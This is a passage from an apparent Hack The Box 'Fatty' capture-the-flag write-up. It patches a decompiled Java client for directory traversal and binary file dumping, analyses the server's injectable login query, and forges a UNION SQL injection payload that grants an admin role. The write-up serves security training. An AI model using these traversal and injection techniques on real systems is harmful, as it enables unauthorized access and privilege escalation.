</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        openFileButton.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>                String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>                String fileName <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>fileTextField</span>.<span style=color:#a6e22e>getText</span>();
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>                    response <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>invoker</span>.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;..&#34;</span>, fileName);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>catch</span> (MessageBuildException <span style=color:#f92672>|</span> MessageParseException e1) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Failure during message building/parsing.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>catch</span> (IOException e2) {
</span></span><span style=display:flex><span>                    JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                textPane.<span style=color:#a6e22e>setText</span>(response);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        });
</span></span></code></pre></div><p>But still <code>/opt/fatty/files</code> prefix. Putting <code>/</code> in foldername is filtered server-side
too.</p><p>Too see what&rsquo;s in that folder let&rsquo;s modify the function that list files in one
folder, from:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>configs.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>        String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>currentFolder</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;configs&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>          response <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>invoker</span>.<span style=color:#a6e22e>showFiles</span>(<span style=color:#e6db74>&#34;configs&#34;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (MessageBuildException<span style=color:#f92672>|</span>htb.<span style=color:#a6e22e>fatty</span>.<span style=color:#a6e22e>shared</span>.<span style=color:#a6e22e>message</span>.<span style=color:#a6e22e>MessageParseException</span> e1) {
</span></span><span style=display:flex><span>          JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Failure during message building/parsing.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (IOException e2) {
</span></span><span style=display:flex><span>          JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>to:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>configs.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>        String response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>currentFolder</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;..&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>          response <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>invoker</span>.<span style=color:#a6e22e>showFiles</span>(<span style=color:#e6db74>&#34;..&#34;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (MessageBuildException<span style=color:#f92672>|</span>htb.<span style=color:#a6e22e>fatty</span>.<span style=color:#a6e22e>shared</span>.<span style=color:#a6e22e>message</span>.<span style=color:#a6e22e>MessageParseException</span> e1) {
</span></span><span style=display:flex><span>          JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Failure during message building/parsing.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>catch</span> (IOException e2) {
</span></span><span style=display:flex><span>          JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(controlPanel, <span style=color:#e6db74>&#34;Unable to contact the server. If this problem remains, please close and reopen the client.&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>So by going to <code>FileBrowser -> Configs</code> we can list what is in <code>/opt/fatty/</code>:</p><pre tabindex=0><code>logs
tar
start.sh
fatty-server.jar
files
</code></pre><p>We now have the name of the server JAR: <code>fatty-server.jar</code>.</p><p><code>/opt/fatty/start.sh</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e># Unfortunately alpine docker containers seems to have problems with services.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># I tried both, ssh and cron to start via openrc, but non of them worked. Therefore,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># both services are now started as part of the docker startup script.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start cron service</span>
</span></span><span style=display:flex><span>crond -b
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start ssh server</span>
</span></span><span style=display:flex><span>/usr/sbin/sshd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start Java application server</span>
</span></span><span style=display:flex><span>su - qtc /bin/sh -c <span style=color:#e6db74>&#34;java -jar /opt/fatty/fatty-server.jar&#34;</span>
</span></span></code></pre></div><p>The server seems to be run as <code>qtc</code> so we won&rsquo;t elevate our privilege directly.</p><p>By doing the same with <code>logs</code> and <code>tar</code> we can see what&rsquo;s inside:</p><p><code>/opt/fatty/logs/</code></p><pre tabindex=0><code>error-log.txt
info-log.txt
</code></pre><p><code>/opt/fatty/tar/</code></p><pre tabindex=0><code>logs.tar
</code></pre><p>What we could access is <code>/opt/fatty/fatty-server.jar</code> but we can only read text
files, not binaries:</p><pre tabindex=0><code>grep -rn binar htb
htb/fatty/client/methods/Invoker.java:140:       response = &#34;Unable to convert byte[] to String. Did you read in a binary file?&#34;;
</code></pre><p>So we will have to modify the function to save the file locally on our
filesystem.</p><p>We&rsquo;ll hack into <code>htb/fatty/client/methods/Invoker.java</code>, the <code>public String open</code>
method.
We&rsquo;ll modify that part, from</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/*     */</span>     <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span><span style=color:#75715e>/* 138 */</span>       response <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>getContentAsString</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>/* 139 */</span>     } <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span><span style=color:#75715e>/* 140 */</span>       response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Unable to convert byte[] to String. Did you read in a binary file?&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>     }
</span></span></code></pre></div><p>to</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.File;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>  response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Write to local FS...&#34;</span>;
</span></span><span style=display:flex><span>  File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(filename);
</span></span><span style=display:flex><span>  FileOutputStream outputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(file);
</span></span><span style=display:flex><span>  outputStream.<span style=color:#a6e22e>write</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>getContent</span>());
</span></span><span style=display:flex><span>  outputStream.<span style=color:#a6e22e>close</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>  response <span style=color:#f92672>-</span> <span style=color:#e6db74>&#34;Error&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>or</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Path;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>  response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Write to local FS...&#34;</span>;
</span></span><span style=display:flex><span>  Path path <span style=color:#f92672>=</span> Paths.<span style=color:#a6e22e>get</span>(filename);
</span></span><span style=display:flex><span>  Files.<span style=color:#a6e22e>write</span>(path, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>getContent</span>());
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>  response <span style=color:#f92672>-</span> <span style=color:#e6db74>&#34;Error&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>or even:</p><p>Let&rsquo;s try to add a method in <code>/htb/fatty/shared/message/ResponseMessage.java</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.FileOutputStream;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>saveContentToFile</span>(String filename) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>(FileOutputStream stream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(filename)) {
</span></span><span style=display:flex><span>            stream.<span style=color:#a6e22e>write</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>content</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>and then in <code>htb/fatty/client/methods/Invoker.java</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>  response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Write to local FS...&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>response</span>.<span style=color:#a6e22e>saveContentToFile</span>(filename);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (Exception e) {
</span></span><span style=display:flex><span>  response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Error&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>With one of those 3 ways we are able to dump binary files.
Let&rsquo;s dump <code>fatty-server.jar</code>:</p><h2 id=code-analysis-fatty-server>Code analysis: fatty server<a hidden class=anchor aria-hidden=true href=#code-analysis-fatty-server>#</a></h2><p>Now let&rsquo;s decompiler the server JAr with <a href=https://java-decompiler.github.io/>JD-GUI</a> again and export
the code to read it with VSCode.</p><p>It&rsquo;s maybe time to looks for the the SQLi, we already know it&rsquo;s in the
connection code.</p><p>The SQL queries seem to be handle in <code>htb/fatty/server/database/FattyDbSession.java</code>.</p><p>The authentication function looks like that:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> User <span style=color:#a6e22e>checkLogin</span>(User user) <span style=color:#66d9ef>throws</span> LoginException {
</span></span><span style=display:flex><span>  Statement stmt <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>  ResultSet rs <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>  User newUser <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    stmt <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>conn</span>.<span style=color:#a6e22e>createStatement</span>();
</span></span><span style=display:flex><span>    rs <span style=color:#f92672>=</span> stmt.<span style=color:#a6e22e>executeQuery</span>(<span style=color:#e6db74>&#34;SELECT id,username,email,password,role FROM users WHERE username=&#39;&#34;</span> <span style=color:#f92672>+</span> user.<span style=color:#a6e22e>getUsername</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>      Thread.<span style=color:#a6e22e>sleep</span>(3000L);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>catch</span> (InterruptedException e) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (rs.<span style=color:#a6e22e>next</span>()) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>int</span> id <span style=color:#f92672>=</span> rs.<span style=color:#a6e22e>getInt</span>(<span style=color:#e6db74>&#34;id&#34;</span>);
</span></span><span style=display:flex><span>      String username <span style=color:#f92672>=</span> rs.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;username&#34;</span>);
</span></span><span style=display:flex><span>      String email <span style=color:#f92672>=</span> rs.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;email&#34;</span>);
</span></span><span style=display:flex><span>      String password <span style=color:#f92672>=</span> rs.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;password&#34;</span>);
</span></span><span style=display:flex><span>      String role <span style=color:#f92672>=</span> rs.<span style=color:#a6e22e>getString</span>(<span style=color:#e6db74>&#34;role&#34;</span>);
</span></span><span style=display:flex><span>      newUser <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> User(id, username, password, email, Role.<span style=color:#a6e22e>getRoleByName</span>(role), <span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (newUser.<span style=color:#a6e22e>getPassword</span>().<span style=color:#a6e22e>equalsIgnoreCase</span>(user.<span style=color:#a6e22e>getPassword</span>())) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> newUser;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> LoginException(<span style=color:#e6db74>&#34;Wrong Password!&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> LoginException(<span style=color:#e6db74>&#34;Wrong Username!&#34;</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>catch</span> (SQLException e) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>logger</span>.<span style=color:#a6e22e>logError</span>(<span style=color:#e6db74>&#34;[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username=&#39;&#34;</span> <span style=color:#f92672>+</span> user.<span style=color:#a6e22e>getUsername</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; &lt;==&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>logger</span>.<span style=color:#a6e22e>logError</span>(<span style=color:#e6db74>&#34;[-] Exception was: &#39;&#34;</span> <span style=color:#f92672>+</span> e.<span style=color:#a6e22e>getMessage</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We can see the <code>Thread.sleep(3000L);</code> that make time-based attacks difficult
but that doesn&rsquo;t mean we can&rsquo;t make a one-shot SQLi as we still control the
username injected in the query.</p><p>Before we forge a payload, let&rsquo;s take a look at the password format saved in DB.
We can see in <code>htb/fatty/shared/resources/User.java</code> is salted and hashed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setPassword</span>(String password) {
</span></span><span style=display:flex><span>  String hashString <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>+</span> password <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;clarabibimakeseverythingsecure&#34;</span>;
</span></span><span style=display:flex><span>  MessageDigest digest <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    digest <span style=color:#f92672>=</span> MessageDigest.<span style=color:#a6e22e>getInstance</span>(<span style=color:#e6db74>&#34;SHA-256&#34;</span>);
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>catch</span> (NoSuchAlgorithmException e) {
</span></span><span style=display:flex><span>    e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> hash <span style=color:#f92672>=</span> digest.<span style=color:#a6e22e>digest</span>(hashString.<span style=color:#a6e22e>getBytes</span>(StandardCharsets.<span style=color:#a6e22e>UTF_8</span>));
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> DatatypeConverter.<span style=color:#a6e22e>printHexBinary</span>(hash);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Let&rsquo;s compute the hash:</p><pre tabindex=0><code>$ printf %s &#39;qtcclarabibiclarabibimakeseverythingsecure&#39; | sha256sum
5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046  -
</code></pre><p>We can also note that only password is checked and only username is used for
user retrieval, that means we can inject whatever we want in the ID field or
email address.
But what matters to us is to change our role from <code>user</code> to <code>admin</code>.</p><p>So we end with the following payload</p><pre tabindex=0><code>cyfun&#39; union select 1337,&#39;qtc&#39;,&#39;qtc@fatty.htb&#39;,&#39;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#39;,&#39;admin
</code></pre><p>Once the payload is injected in the query this will give:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> id,username,email,password,<span style=color:#66d9ef>role</span> <span style=color:#66d9ef>FROM</span> users <span style=color:#66d9ef>WHERE</span> username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cyfun&#39;</span> <span style=color:#66d9ef>union</span> <span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1337</span>,<span style=color:#e6db74>&#39;qtc&#39;</span>,<span style=color:#e6db74>&#39;qtc@fatty.htb&#39;</span>,<span style=color:#e6db74>&#39;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#39;</span>,<span style=color:#e6db74>&#39;admin&#39;</span>
</span></span></code></pre></div><p>In <code>htb/fatty/client/gui/ClientGuiTest.java</code> we can see the password is set by
the <code>setPassword</code> function we saw earlier.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>JButton btnNewButton <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> JButton(<span style=color:#e6db74>&#34;Login &#34;</span>);
</span></span><span style=display:flex><span>btnNewButton.<span style=color:#a6e22e>addActionListener</span>(<span style=color:#66d9ef>new</span> ActionListener() {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>actionPerformed</span>(ActionEvent e) {
</span></span><span style=display:flex><span>        String username <span style=color:#f92672>=</span> ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>tfUsername</span>.<span style=color:#a6e22e>getText</span>().<span style=color:#a6e22e>trim</span>();
</span></span><span style=display:flex><span>        String password <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> String(ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>tfPassword</span>.<span style=color:#a6e22e>getPassword</span>());
</span></span><span style=display:flex><span>        ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>user</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> User();
</span></span><span style=display:flex><span>        ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>setUsername</span>(username);
</span></span><span style=display:flex><span>        ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>user</span>.<span style=color:#a6e22e>setPassword</span>(password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>          ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>conn</span> <span style=color:#f92672>=</span> Connection.<span style=color:#a6e22e>getConnection</span>();
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (htb.<span style=color:#a6e22e>fatty</span>.<span style=color:#a6e22e>client</span>.<span style=color:#a6e22e>connection</span>.<span style=color:#a6e22e>Connection</span>.<span style=color:#a6e22e>ConnectionException</span> e1) {
</span></span><span style=display:flex><span>          JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(LoginPanel, <span style=color:#e6db74>&#34;Connection Error!&#34;</span>, <span style=color:#e6db74>&#34;Error&#34;</span>, 0);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>conn</span>.<span style=color:#a6e22e>login</span>(ClientGuiTest.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>user</span>)) {
</span></span><span style=display:flex><span>          JOptionPane.<span style=color:#a6e22e>showMessageDialog</span>(LoginPanel, <span style=color:#e6db74>&#34;Login Successful!&#34;</span>, <span style=color:#e6db74>&#34;Login&#34;</span>, 1);
</span></span></code></pre></div><p>We can also it in <code>htb/fatty/shared/resources/User.java</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>/*     */</span>   <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>User</span>(<span style=color:#66d9ef>int</span> uid, String username, String password, String email, Role role) {
</span></span><span style=display:flex><span><span style=color:#75715e>/*  20 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>uid</span> <span style=color:#f92672>=</span> uid;
</span></span><span style=display:flex><span><span style=color:#75715e>/*  21 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> username;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*  23 */</span>     String hashString <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>username</span> <span style=color:#f92672>+</span> password <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;clarabibimakeseverythingsecure&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>/*  24 */</span>     MessageDigest digest <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>     <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span><span style=color:#75715e>/*  26 */</span>       digest <span style=color:#f92672>=</span> MessageDigest.<span style=color:#a6e22e>getInstance</span>(<span style=color:#e6db74>&#34;SHA-256&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>/*  27 */</span>     } <span style=color:#66d9ef>catch</span> (NoSuchAlgorithmException e) {
</span></span><span style=display:flex><span><span style=color:#75715e>/*  28 */</span>       e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>     }
</span></span><span style=display:flex><span><span style=color:#75715e>/*  30 */</span>     <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> hash <span style=color:#f92672>=</span> digest.<span style=color:#a6e22e>digest</span>(hashString.<span style=color:#a6e22e>getBytes</span>(StandardCharsets.<span style=color:#a6e22e>UTF_8</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*  32 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> DatatypeConverter.<span style=color:#a6e22e>printHexBinary</span>(hash);
</span></span><span style=display:flex><span><span style=color:#75715e>/*  33 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>email</span> <span style=color:#f92672>=</span> email;
</span></span><span style=display:flex><span><span style=color:#75715e>/*  34 */</span>     <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>role</span> <span style=color:#f92672>=</span> role;
</span></span><span style=display:flex><span><span style=color:#75715e>/*     */</span>   }
